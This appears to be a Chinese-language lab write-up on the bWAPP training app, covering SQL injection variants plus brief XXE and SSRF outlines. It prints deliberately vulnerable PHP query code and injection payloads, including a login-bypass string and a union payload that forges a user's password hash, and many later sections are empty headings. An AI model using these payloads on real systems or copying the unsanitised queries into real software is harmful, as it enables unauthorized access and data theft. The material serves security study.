<h1 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h1><h2 id="产生原因-11"><a href="#产生原因-11" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_POST[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-11"><a href="#利用方式-11" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-11"><a href="#防护方式-11" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-POST-Select"><a href="#SQL-Injection-POST-Select" class="headerlink" title="SQL Injection (POST/Select)"></a>SQL Injection (POST/Select)</h1><h2 id="产生原因-12"><a href="#产生原因-12" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_POST[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-12"><a href="#利用方式-12" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-12"><a href="#防护方式-12" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h1><h2 id="产生原因-13"><a href="#产生原因-13" class="headerlink" title="产生原因"></a>产生原因</h2><p>sqli_10-1.php</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">// Searches for a movie title</span></span><br><span class="line">	<span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AJAX call</span></span><br><span class="line">	$.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">		init_table();</span><br><span class="line">		<span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">		<span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">		$.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;</span><br><span class="line">			total++;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">			&#125;);</span><br><span class="line">		<span class="comment">// Empty result</span></span><br><span class="line">		<span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_table</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#table_yellow"</span>).html(<span class="string">"&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;/tr&gt;"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>sqli_10-2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encodes the result to JSON</span></span><br><span class="line"><span class="keyword">echo</span> json_encode($movies);</span><br></pre></td></tr></table></figure>

<p>这里是使用 Ajax 异步提交数据的方式，如果直接修改 URL 或者刷新页面是不会返回数据的</p>
<p>但是用 burp 抓包之后修改 title 就可以注入。这里注入的原理也是输入未过滤导致可以构造 sql 语句。</p>
<h2 id="利用方式-13"><a href="#利用方式-13" class="headerlink" title="利用方式"></a>利用方式</h2><p>抓包修改 title，构造 sql 语句，查看返回的 json 数据</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png" alt></p>
<h2 id="防护方式-13"><a href="#防护方式-13" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><h2 id="产生原因-14"><a href="#产生原因-14" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>])) </span><br><span class="line">&#123;   </span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面的类似，只是在前面加了一个验证码的页面，防止工具注入，可以用脚本识别</p>
<h2 id="利用方式-14"><a href="#利用方式-14" class="headerlink" title="利用方式"></a>利用方式</h2><p>输入验证码之后进行注入</p>
<p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-14"><a href="#防护方式-14" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h1><h2 id="产生原因-15"><a href="#产生原因-15" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">    $login = sqli($login);</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">    $password = sqli($password);</span><br><span class="line">    </span><br><span class="line">    $sql = <span class="string">"SELECT * FROM heroes WHERE login = '"</span> . $login . <span class="string">"' AND password = '"</span> . $password . <span class="string">"'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $row = mysql_fetch_array($recordset);</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">"login"</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            $message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在表格中提交数据，且数据未过滤。</p>
<p>如果 login 输入 <code>1&#39; or 1=1 or &#39;1</code>，password 输入任意密码，那么查询语句变为 <code>SELECT * FROM heroes WHERE login = &#39;1&#39; or 1=1 or &#39;1&#39; AND password = &#39;xxxx&#39;</code>，由于 sql 语句的逻辑运算，这个语句恒真，即无论输入什么密码，都能登陆，又叫万能密码</p>
<h2 id="利用方式-15"><a href="#利用方式-15" class="headerlink" title="利用方式"></a>利用方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">1</span><span class="string">' or 1=1 or '</span><span class="number">1</span></span><br><span class="line">password : 随意</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-15"><a href="#防护方式-15" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection (Login Form/User)"></a>SQL Injection (Login Form/User)</h1><h2 id="产生原因-16"><a href="#产生原因-16" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$message=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$login = $_POST[<span class="string">"login"</span>];</span><br><span class="line">$login = sqli($login);</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$password = sqli($password);</span><br><span class="line">$password = hash(<span class="string">"sha1"</span>, $password, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE login = '"</span> . $login . <span class="string">"'"</span>;</span><br><span class="line">$recordset = mysql_query($sql, $link);</span><br><span class="line"><span class="keyword">if</span>(!$recordset)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Error: "</span> . mysql_error());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$row = mysql_fetch_array($recordset);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">"login"</span>] &amp;&amp; $password == $row[<span class="string">"password"</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		$message =  <span class="string">"&lt;p&gt;Welcome &lt;b&gt;"</span> . ucwords($row[<span class="string">"login"</span>]) . <span class="string">"&lt;/b&gt;, how are you today?&lt;/p&gt;&lt;p&gt;Your secret: &lt;b&gt;"</span> . ucwords($row[<span class="string">"secret"</span>]) . <span class="string">"&lt;/b&gt;&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$message = <span class="string">"&lt;font color=\"red\"&gt;Invalid credentials!&lt;/font&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面类似，也是没有过滤输入，这样就可以构造 sql 语句</p>
<p>这里代码逻辑就是先查询 login 再用查询的结果判断有没有和 password 的 sha1 相同的账号</p>
<h2 id="利用方式-16"><a href="#利用方式-16" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login : <span class="number">-1</span><span class="string">' union select 1,2,"356a192b7913b04c54574d18c28d46e6395428ab",4,5,6,7,8,9#</span></span><br><span class="line"><span class="string">password : 1</span></span><br></pre></td></tr></table></figure>

<p>查询语句变为 <code>SELECT * FROM users WHERE login = &#39;-1&#39; union select 1,2,&quot;356a192b7913b04c54574d18c28d46e6395428ab&quot;,4,5,6,7,8,9#</code>，这样查询结果就会多一个 union，依靠经验 1 对应 id，2 对应 username，3 对应 password，所以在 3 的位置填入密码的 sha1 值，这样就能构造出来用户为 2，密码为 1 的用户了</p>
<h2 id="防护方式-16"><a href="#防护方式-16" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h1><h2 id="产生原因-17"><a href="#产生原因-17" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-17"><a href="#利用方式-17" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-17"><a href="#防护方式-17" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Drupal"><a href="#SQL-Injection-Drupal" class="headerlink" title="SQL Injection (Drupal)"></a>SQL Injection (Drupal)</h1><h2 id="产生原因-18"><a href="#产生原因-18" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-18"><a href="#利用方式-18" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-18"><a href="#防护方式-18" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h1><h2 id="产生原因-19"><a href="#产生原因-19" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-19"><a href="#利用方式-19" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-19"><a href="#防护方式-19" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h1><h2 id="产生原因-20"><a href="#产生原因-20" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-20"><a href="#利用方式-20" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-20"><a href="#防护方式-20" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h1><h2 id="产生原因-21"><a href="#产生原因-21" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-21"><a href="#利用方式-21" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-21"><a href="#防护方式-21" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h1><h2 id="产生原因-22"><a href="#产生原因-22" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-22"><a href="#利用方式-22" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-22"><a href="#防护方式-22" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h1><h2 id="产生原因-23"><a href="#产生原因-23" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-23"><a href="#利用方式-23" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-23"><a href="#防护方式-23" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h1><h2 id="产生原因-24"><a href="#产生原因-24" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-24"><a href="#利用方式-24" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-24"><a href="#防护方式-24" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h1><h2 id="产生原因-25"><a href="#产生原因-25" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-25"><a href="#利用方式-25" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-25"><a href="#防护方式-25" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="SQL-Injection-Blind-Web-Services-SOAP"><a href="#SQL-Injection-Blind-Web-Services-SOAP" class="headerlink" title="SQL Injection - Blind (Web Services/SOAP)"></a>SQL Injection - Blind (Web Services/SOAP)</h1><h2 id="产生原因-26"><a href="#产生原因-26" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-26"><a href="#利用方式-26" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-26"><a href="#防护方式-26" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form)"></a>XML/XPath Injection (Login Form)</h1><h2 id="产生原因-27"><a href="#产生原因-27" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-27"><a href="#利用方式-27" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-27"><a href="#防护方式-27" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XML-XPath-Injection-Search"><a href="#XML-XPath-Injection-Search" class="headerlink" title="XML/XPath Injection (Search)"></a>XML/XPath Injection (Search)</h1><h2 id="产生原因-28"><a href="#产生原因-28" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-28"><a href="#利用方式-28" class="headerlink" title="利用方式"></a>利用方式</h2><h2 id="防护方式-28"><a href="#防护方式-28" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML 外部实体注入</p>
<p>以 XML 形式发送数据</p>
<p>实现 ssrf</p>
<p>读文件</p>
<p>执行命令</p>
<p>扫描端口</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
<li><p>服务端请求伪造，利用漏洞伪造服务器发送请求，从而获取内网数据</p>
</li>
<li><p>一般情况下，SSRF 的目标就是与外部隔离的内网资源。</p>
</li>
</ul>
<h3 id="SSRF-原理"><a href="#SSRF-原理" class="headerlink" title="SSRF 原理"></a>SSRF 原理</h3><p>服务端提供了从内网获取数据的功能，但没有对请求目标地址做过滤</p>
<h3 id="SSRF-用途"><a href="#SSRF-用途" class="headerlink" title="SSRF 用途"></a>SSRF 用途</h3><ul>
<li>内外网的端口和服务扫描，获取 Banner 信息</li>
<li>服务器本地敏感数据的读取</li>
<li>内外网主机应用程序漏洞的利用</li>
<li>内外网Web站点漏洞的利用 </li>
<li>……</li>
</ul>
<p>产生 SSRF 的 PHP 函数</p>
<p>file_get_content</p>
<p>fsockopen()</p>
<p>curl_exec()</p>
